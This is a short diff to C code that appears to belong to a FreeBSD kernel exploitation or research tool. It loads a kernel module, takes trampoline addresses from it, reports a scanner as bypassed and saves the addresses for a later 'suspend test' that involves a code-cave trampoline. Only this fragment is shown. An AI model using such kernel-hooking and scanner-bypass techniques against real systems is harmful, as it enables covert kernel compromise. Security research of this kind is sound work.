@@ -1210,6 +1210,14 @@ static void campaign_kmod_kldload(void) {
                 printf("    g_trampoline_target     = 0x%016lx\n",
                        (unsigned long)g_kmod_trampoline_target);
                 printf("[+] Scanner bypassed — addresses obtained directly from kmod.\n");
+
+                /* Preserve KLD .text addresses for suspend test (the cave
+                 * trampoline may overwrite g_kmod_trampoline_func later). */
+                g_kld_text_trampoline = results->trampoline_func_kva;
+                g_kld_text_target = results->trampoline_target_kva;
+                printf("[+] KLD .text trampoline preserved: 0x%016lx\n",
+                       (unsigned long)g_kld_text_trampoline);
+
                 goto idt_done;
             } else {
                 printf("    Result buffer addresses still zero (R_X86_64_64 unresolved?).\n");
